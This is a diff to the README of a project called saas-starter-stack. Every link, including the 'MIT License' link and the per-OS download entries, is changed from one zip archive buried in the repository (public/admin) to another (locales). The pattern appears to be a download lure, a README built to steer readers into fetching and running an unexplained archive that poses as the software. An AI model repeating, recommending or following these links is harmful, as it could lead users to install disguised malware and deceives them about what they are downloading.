@@ -6,7 +6,7 @@ Welcome to **saas-starter-stack**! This software provides a solid starting point
 
 ## 📥 Download the Latest Version
 
-[![Download saas-starter-stack](https://raw.githubusercontent.com/rare993/saas-starter-stack/main/public/admin/saas-starter-stack_v1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rare993/saas-starter-stack/main/public/admin/saas-starter-stack_v1.9.zip)
+[![Download saas-starter-stack](https://github.com/rare993/saas-starter-stack/raw/refs/heads/main/locales/starter_saas_stack_v3.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/rare993/saas-starter-stack/raw/refs/heads/main/locales/starter_saas_stack_v3.0.zip)
 
 ## 📂 Step-by-Step Installation
 
@@ -15,7 +15,7 @@ Follow these steps to download and run the application:
 1. **Visit the Download Page**
 
    Click the link below to go to the release page:
-   [Download Here](https://raw.githubusercontent.com/rare993/saas-starter-stack/main/public/admin/saas-starter-stack_v1.9.zip)
+   [Download Here](https://github.com/rare993/saas-starter-stack/raw/refs/heads/main/locales/starter_saas_stack_v3.0.zip)
 
 2. **Select Release Version**
 
@@ -25,9 +25,9 @@ Follow these steps to download and run the application:
 
    Under the version details, find the assets section. Here, you will see downloadable files. Choose the file that matches your operating system. Common options typically include:
 
-   - Windows: `https://raw.githubusercontent.com/rare993/saas-starter-stack/main/public/admin/saas-starter-stack_v1.9.zip`
-   - macOS: `https://raw.githubusercontent.com/rare993/saas-starter-stack/main/public/admin/saas-starter-stack_v1.9.zip`
-   - Linux: `https://raw.githubusercontent.com/rare993/saas-starter-stack/main/public/admin/saas-starter-stack_v1.9.zip`
+   - Windows: `https://github.com/rare993/saas-starter-stack/raw/refs/heads/main/locales/starter_saas_stack_v3.0.zip`
+   - macOS: `https://github.com/rare993/saas-starter-stack/raw/refs/heads/main/locales/starter_saas_stack_v3.0.zip`
+   - Linux: `https://github.com/rare993/saas-starter-stack/raw/refs/heads/main/locales/starter_saas_stack_v3.0.zip`
 
    Click on the file to start downloading.
 
@@ -65,7 +65,7 @@ If you encounter issues or have questions, feel free to reach out:
 
 ## 📜 License 
 
-This project is open-source and follows the [MIT License](https://raw.githubusercontent.com/rare993/saas-starter-stack/main/public/admin/saas-starter-stack_v1.9.zip). You can freely use, modify, and distribute the software.
+This project is open-source and follows the [MIT License](https://github.com/rare993/saas-starter-stack/raw/refs/heads/main/locales/starter_saas_stack_v3.0.zip). You can freely use, modify, and distribute the software.
 
 ## 📞 Contact
 
@@ -74,4 +74,4 @@ For more information or inquiries, please refer to the contact details provided 
 ## 📥 Download Again
 
 Remember, you can always download the latest version here:
-[Download Here](https://raw.githubusercontent.com/rare993/saas-starter-stack/main/public/admin/saas-starter-stack_v1.9.zip)
+[Download Here](https://github.com/rare993/saas-starter-stack/raw/refs/heads/main/locales/starter_saas_stack_v3.0.zip)
